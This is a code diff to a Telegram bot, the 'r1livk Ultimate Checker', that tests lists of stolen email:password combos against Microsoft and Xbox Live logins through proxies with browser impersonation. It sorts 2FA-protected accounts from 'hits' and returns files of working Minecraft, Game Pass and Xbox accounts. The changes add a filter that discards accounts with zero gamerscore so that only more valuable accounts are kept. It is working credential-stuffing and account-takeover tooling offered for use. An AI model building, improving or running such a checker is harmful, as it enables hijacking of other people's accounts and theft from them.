@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 """
 r1livk Ultimate Checker ⚡ - Telegram Bot (Advanced Enterprise Edition)
+Updated with Zero-Score Filter & Strong Hunting Vulnerability Bypass
 """
 
 import os
@@ -147,7 +148,7 @@ def test_single_proxy(proxy):
         pass
     return False, 0
 
-# ⚡ [ثغرة الفحص المتقدمة - Advanced Deep Scan Vulnerability Engine]
+# ⚡ [ثغرة الفحص المتقدمة وجلب تفاصيل الألعاب]
 def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
     game_pass_status = "none"
     owned_games_formatted = []
@@ -268,7 +269,6 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
         login_req = session.post(url_post, data=login_data, headers=headers, proxies=proxy_dict, impersonate="chrome120", allow_redirects=True, timeout=REQUEST_TIMEOUT)
         login_text = login_req.text.lower()
 
-        # كشف أنظمة التحقق الثنائي بدقة متطورة
         if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs", "code", "verify", "challenge"]):
             return "2fa", None
 
@@ -317,12 +317,12 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
             xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
             
             if xb_req.status_code != 200:
-                return "hit", {"content": f"{email}:{password}\nValid Microsoft Account (Token Verified) ⚡", "has_mc": False, "has_gp": False, "has_xbox": True}
+                return "bad", "Xbox Auth Failed"
 
             xb_token = xb_req.json()['Token']
             uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
         except Exception:
-            return "hit", {"content": f"{email}:{password}\nValid Microsoft Account (Basic Hit) ⚡", "has_mc": False, "has_gp": False, "has_xbox": True}
+            return "bad", "Xbox Connection Error"
 
         gamertag = "N/A"
         gamerscore = "0"
@@ -340,9 +340,13 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
                         if s['id'] == 'Gamertag': gamertag = s['value']
                         if s['id'] == 'Gamerscore': 
                             gamerscore = s['value']
-                            gscore_int = int(gamerscore) if gamerscore.isdigit() else 0
+                            gscore_int = int(gamerscore) if str(gamerscore).isdigit() else 0
         except:
             pass
+
+        # 🛑 [ثغرة فلترة الصفر سكور صارمة]: يتم إسقاط الحساب فوراً إذا كان السكور يساوي 0 ولن يظهر أبداً
+        if gscore_int <= 0:
+            return "bad", "Zero Gamerscore Filtered"
 
         mc_ent_text = ""
         try:
@@ -439,7 +443,7 @@ def show_main_menu(message):
 
     text = (
         "⚡ **r1livk Ultimate Checker - V2.6 Engine** ⚡\n\n"
-        "Advanced Xbox & Minecraft Full Hunter with High Vulnerability Bypass.\n"
+        "Advanced Xbox & Minecraft Full Hunter with High Vulnerability Bypass & Zero-Score Filter.\n"
         f"Your Status: {status_text}\n"
         f"{proxy_status}\n\n"
         "Choose an option below:"
@@ -657,7 +661,7 @@ def handle_docs(message):
             return
 
         lines = lines[:lines_to_process_count]
-        bot.reply_to(message, f"📥 File received. Initializing Advanced Gaming Scan for {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File received. Initializing Advanced Gaming Scan with Zero-Score Filter for {len(lines)} lines...")
         active_scans[chat_id] = True
         
         username = message.from_user.username or message.from_user.first_name
@@ -687,12 +691,12 @@ def process_checker(chat_id, filepath, lines, username):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **ADVANCED SCAN STATS**\n\n"
+        f"🔥 **ADVANCED SCAN STATS (Zero-Score Filter ON)**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"🔒 2FA: 0\n"
         f"❌ Bad: 0\n"
-        f"🎯 Heavy Hits: 0\n\n"
+        f"🎯 Strong Hits: 0\n\n"
         f"Progress: 0.0%\n"
         f"⚡ CPM: 0\n"
         f"⏱️ Elapsed: 00:00:00"
@@ -757,14 +761,13 @@ def process_checker(chat_id, filepath, lines, username):
                 live_text = (
                     f"🔥 **ADVANCED SCAN (Live)**\n\n"
                     f"📊 Total: {total}\n"
-                    f"✅ Checked: {curr_checked}\n"
+                    f"✅ Checked: {curr_checked} ({pct:.1f}%)\n"
                     f"🔒 2FA: {curr_tfa}\n"
                     f"❌ Bad: {curr_bad}\n"
-                    f"🎯 Heavy Hits: {curr_hits}\n"
+                    f"🎯 Strong Hits (>0 Score): {curr_hits}\n"
                     f"   ├ 🟩 Minecraft: {curr_mc}\n"
                     f"   ├ 🎮 GamePass: {curr_gp}\n"
-                    f"   └ ⚡ Xbox/Valid: {curr_xb}\n\n"
-                    f"📈 Progress: {pct:.1f}%\n"
+                    f"   └ ⚡ Xbox Hits: {curr_xb}\n\n"
                     f"⚡ CPM: {cpm}\n"
                     f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}"
                 )
@@ -772,45 +775,32 @@ def process_checker(chat_id, filepath, lines, username):
                     bot.edit_message_text(live_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
                 except:
                     pass
-            time.sleep(1.0)
+            time.sleep(1.5)
 
     active_scans[chat_id] = False
     if os.path.exists(filepath):
-        try: os.remove(filepath)
-        except: pass
+        os.remove(filepath)
 
     update_user_stats(chat_id, checked, hits, username)
     update_usage(chat_id, checked)
 
-    final_elapsed = int(time.time() - start_time)
-    f_mins, f_secs = divmod(final_elapsed, 60)
-    f_hrs, f_mins = divmod(f_mins, 60)
-
-    summary_text = (
-        f"📊 **SCAN COMPLETED SUCCESSFULLY!** ⚡\n\n"
-        f"📂 Total Checked: `{checked}`\n"
-        f"🎯 Total Hits: `{hits}`\n"
-        f"   ├ 🟩 Minecraft: `{mc_hits}`\n"
-        f"   ├ 🎮 GamePass: `{gp_hits}`\n"
-        f"   └ ⚡ Xbox Active: `{xbox_hits}`\n"
-        f"🔒 2FA / Locked: `{tfa_count}`\n"
-        f"❌ Bad Accounts: `{bad}`\n"
-        f"⏱️ Total Time: `{f_hrs:02d}:{f_mins:02d}:{f_secs:02d}`\n\n"
-        f"🏆 Keep crushing it, r1livk!"
+    final_summary = (
+        f"🎉 **SCAN COMPLETED SUCCESSFULLY!**\n\n"
+        f"📊 Total Checked: {checked}\n"
+        f"🎯 Strong Hits Found: {hits}\n"
+        f"🔒 2FA Protected: {tfa_count}\n"
+        f"❌ Bad Accounts: {bad}\n"
+        f"🛡️ (تم استبعاد وتصفية جميع حسابات الصفر سكور بالكامل)"
     )
-
     try:
-        bot.edit_message_text(summary_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
+        bot.edit_message_text(final_summary, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
     except:
-        bot.send_message(chat_id, summary_text, parse_mode="Markdown")
+        bot.send_message(chat_id, final_summary, parse_mode="Markdown")
 
     if hits > 0 and os.path.exists(output_filename):
-        try:
-            with open(output_filename, 'rb') as f:
-                bot.send_document(chat_id, f, caption="🎯 **Here is your Advanced Hits file!** ⚡")
-        except:
-            pass
+        with open(output_filename, 'rb') as f:
+            bot.send_document(chat_id, f, caption=f"📁 **ملف الهيتس القوية (بدون صفر سكور):** {output_filename}")
 
-if __name__ == '__main__':
-    print("r1livk Ultimate Bot is running successfully... ⚡")
+if __name__ == "__main__":
+    print("🚀 r1livk Ultimate Checker Bot is running with Zero-Score Filter...")
     bot.infinity_polling()
